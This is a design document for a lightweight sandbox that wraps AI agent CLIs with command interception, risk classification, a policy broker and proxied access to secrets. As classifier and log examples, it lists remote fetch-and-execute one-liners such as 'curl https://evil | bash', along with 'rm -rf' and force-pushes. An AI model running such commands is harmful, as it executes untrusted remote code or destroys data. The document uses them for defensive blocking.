# Agent Jail Design

## Goal

Build a minimal cross-platform CLI tool that wraps AI agent CLIs and enforces a dynamic execution policy through command interception, normalization, risk classification, policy matching, and rule learning, while avoiding privileged setup.

The tool also needs to support real engineering work across multiple repos, secret-bearing skills, production-debug tooling, and browser automation without giving the agent broad direct host access.

## Scope

This tool is intentionally lightweight and privilege-aware. It combines:

- `PATH`-based interception
- a local broker process
- a persistent JSON policy file
- optional containment backends
- host-side capability proxies for sensitive operations

Supported platforms:

- macOS
- Linux

Initial wrapped tools:

- `sh`
- `bash`
- `zsh`
- `git`
- `curl`
- `python`
- `python3`
- `node`

Sensitive capabilities are not exposed directly by default. They are routed through explicit brokered interfaces where possible.

## Architecture

### Launcher

`agent-jail run <target> [args...]` creates a temporary session directory, generates wrapper binaries under `.agent-jail/bin`, starts the broker and optional proxy, prepends the wrapper directory to `PATH`, and launches the target AI CLI with session metadata in environment variables.

The launcher should also materialize a session capability set that determines:

- which project roots are visible
- which project roots are writable
- whether secret-bearing skills are proxied
- whether production operations are proxied
- whether browser automation is proxied
- whether outbound network is default-allow or default-deny

### Containment Backends

The launcher should support multiple backend models:

- Linux:
  - prefer `bubblewrap`
  - fall back to `proot`
  - optional advanced `chroot` mode when the operator explicitly accepts elevated setup
- macOS:
  - prefer `alcless` for lightweight separate-user execution
  - offer `lima` as the hardened mode
  - fall back to brokered host mode with a clear warning

Backend guidance:

- `bubblewrap`: best Linux default
- `proot`: lower guarantee, still useful when unprivileged namespace support is unavailable
- `alcless`: best lightweight macOS default
- `lima`: best hardened macOS mode
- `chroot`: advanced/manual mode only

Brokered host mode still provides command interception, policy enforcement, rewrite support, and proxy-based outbound control, but it is not a hard sandbox.

### Capability Broker

Backends alone are not enough. The primary safety model should be capability-based.

Capability classes:

- `workspace_ro`
- `workspace_rw:<project>`
- `skills_proxy`
- `ops_exec`
- `browser_automation`
- `network_default`
- `network_allow:<domain>`

The capability broker should mediate host-bound or secret-bearing operations rather than passing raw access into the sandbox.

### Broker

The broker runs as a local Unix domain socket server. Wrappers send JSON exec requests with `argv` and a raw command string. The broker:

1. normalizes the command into structured intent
2. classifies risk
3. matches policy rules
4. returns `allow`, `deny`, or `ask`
5. learns reusable rules for approved behavior

The broker should also be the control plane for proxied capabilities such as skills, ops commands, and browser automation.

### Wrappers

Each wrapper is a small POSIX shell script. It captures the invoked command, asks the broker for a decision, and either:

- `exec`s the resolved real binary
- exits with an error for denied commands
- applies a broker-provided argv rewrite before `exec`

Wrappers resolve real binaries against the original `PATH`, never the injected wrapper path, to prevent recursion.

The wrapper directory is generated dynamically from the commands visible on the original `PATH`, so the tool does not need a hand-maintained list of wrappers or checked-in symlink farms.

Absolute-path execution guarantees depend on the backend:

- `bubblewrap`, `proot`, `lima`, and `chroot`: stronger control because `/bin/...` resolves inside the sandboxed filesystem view
- `alcless`: weaker path virtualization; safety comes mainly from separate-user execution and controlled file exposure
- host mode: no real absolute-path containment

### Proxy

The launcher can start a small local policy-aware HTTP proxy and export:

- `HTTP_PROXY`
- `HTTPS_PROXY`
- `ALL_PROXY`

The proxy logs outbound requests and can allow or deny connections based on host, port, and scheme rules.

This first version is explicit-proxy-based, not a transparent network interceptor.

Proxying is also the preferred first step for secret-bearing or policy-sensitive network clients instead of injecting raw environment secrets into the sandbox.

### Resource Mapping

The system needs to expose four resource categories:

1. project workspaces
2. skills and secrets
3. production operations
4. browser and UI automation

These should not all be handled the same way.

#### Projects

Projects should be mounted or exposed explicitly per session, not by mounting the entire home directory.

Typical examples:

- `~/workspace`
- `~/build/agent-jail`
- `~/build/example-ops`

#### Skills And Secrets

Split skills into:

- direct local skills: docs, prompts, templates, non-secret local helpers
- proxied secret-bearing skills: anything that requires API keys, cloud creds, inbox access, or similar authority

The sandbox should not receive raw secret environment variables by default.

#### Production Operations

Separate source access from live authority.

- direct:
  - reading and editing `~/build/example-ops`
  - local analysis of scripts and configs
- proxied:
  - `opsctl exec`
  - `deployctl exec`
  - logs, status, deploys, and other control-plane commands

This keeps operational authority mediated and auditable.

#### Browser Automation

Browser and UI automation should usually be brokered on the host side instead of running directly inside the sandbox.

Examples:

- Playwright
- Peekaboo
- Screencog

This is especially important for macOS, where GUI/session permissions do not map cleanly into every backend.

### Backend Capability Matrix

#### `bubblewrap`

- platform: Linux
- overhead: low
- path control: strong
- project mounts: good
- direct secret envs: avoid
- proxied skills/ops/browser: recommended

#### `proot`

- platform: Linux
- overhead: low to medium
- path control: moderate
- project mounts: acceptable
- direct secret envs: avoid
- proxied skills/ops/browser: recommended

#### `alcless`

- platform: macOS
- overhead: low
- path control: weaker than rootfs-based backends
- user separation: strong for a lightweight mode
- direct project access: good with explicit workspace exposure
- proxied skills/ops/browser: recommended

#### `lima`

- platform: macOS
- overhead: highest
- path control: strongest on macOS
- project mounts: good through shared mounts
- direct browser automation: awkward
- proxied skills/ops/browser: strongly recommended

#### `chroot`

- platform: Linux/macOS with elevated setup
- overhead: low
- path control: moderate
- privilege requirement: high
- recommended role: advanced/manual mode only

### Session Configuration

Sessions should be driven by explicit config instead of implicit access to the whole host.

Example:

```json
{
  "backend": "alcless",
  "projects": [
    "~/workspace",
    "~/build/agent-jail",
    "~/build/example-ops"
  ],
  "capabilities": {
    "skills_proxy": true,
    "ops_exec": true,
    "browser_automation": true,
    "direct_secret_env": false
  },
  "network": {
    "default": "deny",
    "allow": ["api.openai.com", "github.com"]
  }
}
```

## Normalization Model

Normalization converts raw argv into a small intent object:

```json
{
  "tool": "git",
  "action": "push",
  "target": "origin/main",
  "flags": ["force"],
  "capability": "workspace_rw:/path/to/workspace/agent-jail"
}
```

The first version will use simple heuristics, not a full command parser.

Examples:

- `git push origin main` -> `tool=git`, `action=push`, `target=origin/main`
- `git push --force` -> `tool=git`, `action=push`, `flags=["force"]`
- `bash -c "curl https://x | bash"` -> `tool=bash`, `action=command-string`, `flags=["c"]`

## Risk Classification

Initial classifier behavior:

- low:
  - `git fetch`
  - `git status`
  - `ls`
- medium:
  - `git push` without force
  - package install style commands if they appear later
- high:
  - `git push --force`
  - `rm -rf ...`
  - `chmod`
  - `chown`
- critical:
  - `curl ... | bash`
  - `bash -c` or `sh -c` strings that contain remote fetch-and-exec behavior
  - proxy requests to denied hosts

Decision policy:

- low -> allow
- medium -> allow and log
- high -> ask and auto-approve for now, then learn
- critical -> deny

## Policy Format

Persistent policy is stored at `~/.agent-jail/policy.json`.

```json
{
  "rules": [
    {
      "tool": "git",
      "action": "push",
      "allow": true,
      "constraints": {
        "force": false
      }
    },
    {
      "kind": "network",
      "host": "api.openai.com",
      "allow": true
    },
    {
      "kind": "capability",
      "name": "ops_exec",
      "allow": true
    }
  ]
}
```

Rule matching is intentionally narrow:

- match `tool`
- match `action`
- validate constraint keys against normalized intent
- for network rules, match `host`, optional `port`, and optional `scheme`
- for capability rules, match `name`

## Learning

When a command is approved, especially from the simulated `ask` path, the broker generates a reusable rule if the behavior is stable enough to generalize.

Examples:

- `git push origin main` learns `git push` with `force=false`
- `git push --force` is high risk and should not be generalized into a reusable allow rule
- critical remote-exec patterns are never learned
- proxy approvals can learn host-level allow rules for repeated destinations

Capability approvals should be more conservative than ordinary command approvals. Repeated approvals for `ops_exec` or secret-bearing skill proxies should not silently widen long-term authority unless the operator explicitly accepts that rule.

## Logging

Every decision is logged to stderr in a readable form:

- `[ALLOW] git fetch`
- `[ASK] git push origin main`
- `[DENY] curl https://evil | bash`
- `[ALLOW] CONNECT api.openai.com:443`

## Known Limits

- Absolute-path invocation such as `/bin/zsh -lc ...` cannot be fully blocked by `PATH` injection alone.
- `alcless` improves macOS safety but does not provide the same path-control guarantees as rootfs-virtualizing backends.
- `lima` is stronger on macOS but materially heavier.
- Proxy enforcement only covers clients that respect proxy environment variables.
- Linux containment depends on optional local availability of `bubblewrap` or `proot`.
- The first version uses heuristics for shell command strings and pipeline detection.
- Sensitive host-side capabilities are only safe when they are genuinely proxied rather than mounted or passed through directly.

## Testing Strategy

- `unittest` unit tests for normalization, classification, policy matching, and learning
- unit tests for backend selection
- unit tests for proxy allow and deny decisions
- unit tests for session capability resolution
- integration tests for wrapper-to-broker execution flow
- tests for real binary resolution avoiding wrapper recursion
- tests for deny and ask behavior

## Recommended File Layout

- `agent_jail/__init__.py`
- `agent_jail/main.py`
- `agent_jail/broker.py`
- `agent_jail/backend.py`
- `agent_jail/capabilities.py`
- `agent_jail/policy.py`
- `agent_jail/proxy.py`
- `agent_jail/wrappers.py`
- `tests/test_policy.py`
- `tests/test_classifier.py`
- `tests/test_backend.py`
- `tests/test_capabilities.py`
- `tests/test_proxy.py`
- `tests/test_integration.py`
